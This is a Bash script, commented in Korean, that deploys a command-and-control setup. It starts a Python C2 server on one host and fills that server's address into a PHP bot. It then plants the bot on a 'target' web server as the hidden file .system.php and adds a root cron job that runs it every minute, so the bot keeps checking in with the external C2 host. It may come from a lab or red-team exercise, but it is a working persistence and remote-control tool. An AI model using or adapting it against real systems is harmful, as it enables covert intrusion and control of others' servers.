#!/bin/bash
#
# C2 시스템 빠른 배포 스크립트
# 사용법: ./빠른_C2_배포.sh
#

set -e

# 색상 코드
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# 설정
C2_SERVER="57.181.28.7"
OPERATOR_SERVER="52.192.8.114"
TARGET="52.78.221.104"
SSH_KEY="~/.ssh/id_rsa"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}  C2 시스템 빠른 배포${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo "C2 서버: $C2_SERVER"
echo "오퍼레이터: $OPERATOR_SERVER"
echo "타겟: $TARGET"
echo ""

# 1단계: C2 서버 설정
echo -e "${YELLOW}[1/3] C2 서버 설정 중...${NC}"

echo "  - C2 서버에 파일 업로드"
scp -i $SSH_KEY fin/c2/simple_c2_server.py ec2-user@$C2_SERVER:~/

echo "  - 필요한 패키지 설치"
ssh -i $SSH_KEY ec2-user@$C2_SERVER << 'ENDSSH'
sudo yum install -y python3-pip > /dev/null 2>&1
pip3 install flask --user > /dev/null 2>&1
ENDSSH

echo "  - C2 서버 시작"
ssh -i $SSH_KEY ec2-user@$C2_SERVER << 'ENDSSH'
# 기존 프로세스 종료
pkill -f simple_c2_server.py 2>/dev/null || true

# 백그라운드로 실행
nohup python3 ~/simple_c2_server.py > ~/c2.log 2>&1 &
sleep 2

# 확인
if pgrep -f simple_c2_server.py > /dev/null; then
    echo "✓ C2 서버 실행 중"
else
    echo "✗ C2 서버 시작 실패"
    exit 1
fi
ENDSSH

echo -e "${GREEN}  ✓ C2 서버 설정 완료${NC}"
echo ""

# 2단계: C2 봇 수정 및 배포
echo -e "${YELLOW}[2/3] C2 봇 배포 중...${NC}"

# c2_bot.php 수정 (C2 서버 주소 업데이트)
echo "  - C2 봇 설정 업데이트"
sed "s|YOUR_C2_IP|$C2_SERVER|g" fin/c2/c2_bot.php > /tmp/c2_bot_configured.php

echo "  - 타겟 서버에 봇 업로드"
scp -i $SSH_KEY /tmp/c2_bot_configured.php ec2-user@$TARGET:/tmp/c2_bot.php

echo "  - 웹 디렉토리로 이동 및 권한 설정"
ssh -i $SSH_KEY ec2-user@$TARGET << 'ENDSSH'
sudo cp /tmp/c2_bot.php /var/www/html/www/.system.php
sudo chmod 644 /var/www/html/www/.system.php
sudo chown apache:apache /var/www/html/www/.system.php
ENDSSH

echo "  - Cron 작업 설정 (1분마다 실행)"
ssh -i $SSH_KEY ec2-user@$TARGET << 'ENDSSH'
sudo bash -c 'echo "* * * * * root php /var/www/html/www/.system.php > /dev/null 2>&1" > /etc/cron.d/c2bot'
sudo chmod 644 /etc/cron.d/c2bot
ENDSSH

echo -e "${GREEN}  ✓ C2 봇 배포 완료${NC}"
echo ""

# 3단계: 테스트
echo -e "${YELLOW}[3/3] 연결 테스트 중...${NC}"

echo "  - C2 서버 응답 확인"
if curl -s http://$C2_SERVER:8080/bots > /dev/null; then
    echo -e "${GREEN}  ✓ C2 서버 응답 정상${NC}"
else
    echo -e "${RED}  ✗ C2 서버 응답 없음${NC}"
    echo "  AWS 보안 그룹에서 포트 8080을 열어주세요!"
fi

echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}  배포 완료!${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo "웹 인터페이스: http://$C2_SERVER:8080/"
echo ""
echo "봇 체크인 대기 중... (최대 1분 소요)"
echo "봇 목록 확인: curl http://$C2_SERVER:8080/bots"
echo ""
echo "또는 SSH 터널로 안전하게 접속:"
echo "  ssh -L 8080:localhost:8080 ec2-user@$C2_SERVER"
echo "  브라우저: http://localhost:8080/"
echo ""

# 정리
rm -f /tmp/c2_bot_configured.php

echo -e "${YELLOW}1분 후 봇 목록을 확인해보세요:${NC}"
echo "  curl http://$C2_SERVER:8080/bots | python3 -m json.tool"
